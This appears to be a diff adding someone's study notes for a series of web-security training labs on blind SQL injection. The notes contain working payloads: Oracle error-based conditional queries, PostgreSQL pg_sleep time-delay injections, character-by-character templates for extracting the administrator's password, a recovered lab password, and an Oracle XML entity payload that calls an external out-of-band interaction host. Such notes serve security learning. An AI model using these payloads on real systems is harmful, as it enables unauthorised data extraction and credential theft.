@@ -1,0 +1,52 @@
+lab11
+ blind SQL injection vulnerability
+ The application uses a tracking cookie for analytics
+ the application includes a "Welcome back" message  if the query returns any rows
+ The database:
+    table called users, with columns called username and password
+    find out the password of the administrator user.
+ objectif:
+        log in as the administrator user
+        NUmber of characters: 20
+        qoih4038gwm1xaf9of15
+lab12
+ blind SQL injection vulnerability 
+ The application uses a tracking cookie for analytics
+ SQL query causes an error, then the application returns a custom error message
+ The database:
+    table called users, with columns called username and password
+    find out the password of the administrator user.
+ objectif:
+        log in as the administrator user
+ info:
+        oracle database WHERE ROWNUM = 1
+        determine type of db
+        ' ||  (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual ) || ' => no error found
+        determine that table users and column usermane = 'administrator' exist 
+        ' ||  (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' ) || ' => no error found
+        determine Length of password
+        ' ||  (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' ) || ' => if an error condition true else false
+        found : 20 characters
+        determine password:
+        ' ||  (SELECT CASE WHEN substr(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' ) || '
+
+lab13
+ tracking cookie for analytics
+ SQL query containing the value of the submitted cookie
+ results of the SQL query are not returned
+ the application does not respond any differently based on whether the query returns any rows or causes an error.
+ possible to trigger conditional time delays
+ Objectif :
+   exploit the SQL injection vulnerability to cause a 10 second delay.
+ info:
+   postgreSQL
+   '%3bSELECT+pg_sleep(10)--
+
+lab14
+   Find version:
+      '+||+pg_sleep(5)-- => work ,postgreSQL
+      ' ||  (SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(5) ELSE '' END FROM users where username='administrator' )-- => password has 20chars
+      ' ||  (SELECT CASE WHEN substring(password,§1§,1)='§a§' THEN pg_sleep(5) ELSE '' END FROM users where username='administrator' )--
+
+lab15,16 => i need burp pro, i couldnt use zap, interactsh..
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ch542qt2vtc0000gtzjgge11bceyyyyyb.oast.fun/"> %remote;]>'),'/l') FROM dual
